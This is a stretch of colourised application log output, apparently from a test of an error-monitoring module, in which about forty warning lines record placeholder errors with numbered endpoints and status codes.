WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775522Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1658'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775569Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1659'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775616Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1660'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775663Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1661'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775712Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1662'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775759Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1663'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775807Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1664'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1665'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775901Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1666'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775947Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1667'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.775995Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1668'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776090Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1669'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776161Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1670'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776216Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1671'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776269Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1672'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776319Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1673'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776372Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1674'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776423Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1675'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776478Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1676'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776531Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1677'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776584Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1678'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776635Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1679'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776683Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1680'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1681'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1682'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1683'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.776951Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1684'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777016Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1685'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777071Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1686'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1687'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777171Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1688'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777221Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1689'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777272Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1690'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777326Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1691'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777381Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1692'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1693'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777487Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1694'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1695'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777589Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1696'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777638Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1697'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
